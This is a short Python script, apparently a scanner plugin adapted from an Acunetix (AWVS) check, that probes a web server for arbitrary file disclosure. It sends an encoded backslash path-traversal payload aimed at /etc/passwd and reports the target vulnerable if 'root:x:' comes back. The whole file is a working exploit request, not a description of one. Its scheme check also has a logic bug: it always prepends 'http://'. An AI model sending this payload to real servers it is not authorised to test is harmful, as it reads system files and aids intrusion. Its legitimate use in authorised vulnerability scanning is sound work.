#!/usr/bin/env python
# coding=utf-8

import urlparse
import requests


def verify(ip, port=80, name='', timeout=10, types='ip'):
    '''
    payload from awvs decode script: arbitrary_file_existence_disclosure_in_Action.script
    '''

    if types == 'ip':
        url = "{}:{}".format(ip, port)
    else:
        url = ip

    if not url.startswith("http:") or not url.startswith("https:"):
        url = 'http://' + url
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
                'Connection': 'close'}
    
    parsed_url = urlparse.urlparse(url)
    path = '%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd'

    aimed_url = parsed_url.scheme + '://' + parsed_url.netloc
    origin_path = '/'

    aimed_url += origin_path
    aimed_url += path

    info = {
        'url': aimed_url,
        'severity': 'medium',
        'vuln_name': 'arbitray_file',
        'proof': ':root:x'
    }

    try:
        resp = requests.get(aimed_url, headers=headers, verify=False, allow_redirects=False)
        html = resp.text
        if 'root:x:' in html:
            return info
        else:
            return False

    except Exception as e:
        pass
    return False